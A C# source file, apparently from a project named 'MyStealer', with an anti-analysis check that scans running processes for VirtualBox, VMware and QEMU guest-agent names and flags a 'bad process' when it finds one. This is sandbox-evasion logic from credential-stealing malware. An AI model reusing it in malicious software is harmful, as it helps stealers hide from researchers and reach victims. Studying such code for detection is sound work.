using System;
using System.Diagnostics;

namespace MyStealer.AntiDebug.Check
{
    internal class Processes : CheckBase
    {
        public override string Name => "Processes";

        private readonly string[] processNames = new string[]
        {
            "VBoxService",
            "VGAuthService",
            "vmusrvc",
            "qemu-ga"
        };

        public override bool CheckPassive()
        {
            foreach (var process in Process.GetProcesses())
            {
                foreach (var name in processNames)
                {
                    if (string.Equals(process.ProcessName, name, StringComparison.OrdinalIgnoreCase))
                    {
                        Logger.Information("Bad process {name} found.", name);
                        return true;
                    }
                }
            }

            return false;
        }
    }
}
